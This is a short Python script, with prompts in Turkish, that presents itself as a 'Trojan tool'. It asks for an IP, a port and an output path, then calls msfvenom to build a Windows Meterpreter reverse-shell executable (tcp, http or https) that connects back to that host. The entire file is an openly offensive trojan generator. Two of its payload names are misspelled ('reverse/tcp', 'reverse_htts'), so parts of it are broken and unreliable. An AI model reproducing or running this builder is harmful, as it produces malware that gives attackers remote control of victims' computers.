#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN ")
print("""
Trojan Aracina Hosgeldiniz.

""")
ip = raw_input("Local veya Dis Ip Giriniz: ")
port = raw_input("Port Girin: ")
print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https

""")

payload = raw_input("Payload No Giriniz: ")
kayityeri = raw_input("Kayit Yeri Giriniz: ")

if(payload=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse/tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
		
elif(payload=="2"):
		os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)	
elif(payload=="3"):
		os.system("msfvenom -p windows/meterpreter/reverse_htts LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)	

else:

		print("Yanlis Tuslama")
